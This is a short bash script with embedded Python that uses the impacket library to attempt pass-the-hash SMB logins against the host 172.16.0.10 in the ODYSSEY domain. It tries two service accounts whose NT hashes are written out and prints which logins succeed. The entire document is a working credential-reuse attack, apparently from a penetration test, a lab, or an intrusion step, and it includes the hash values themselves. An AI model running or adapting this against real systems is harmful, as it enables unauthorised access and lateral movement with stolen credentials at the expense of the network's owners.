#!/bin/bash
export PYTHONPATH=/tmp/pylibs
# try smb auth with known hashes using impacket if present in pylibs
python3 - <<'PY'
import sys
sys.path.insert(0,"/tmp/pylibs")
try:
  from impacket.smbconnection import SMBConnection
  for u,h in [("svc-aegis-deploy","3a5026b2aa5ef2cbb7cb6a7be3a2bcfa"),("svc-aegis-build","bbc270509ec878cf516d5295fb4d774d")]:
    try:
      c=SMBConnection("172.16.0.10","172.16.0.10")
      c.login(u,"",domain="ODYSSEY",lmhash="aad3b435b51404eeaad3b435b51404ee",nthash=h)
      print("OK",u,h)
      c.logoff()
    except Exception as e:
      print("FAIL",u,type(e).__name__,e)
except Exception as e:
  print("impacket missing",e)
PY
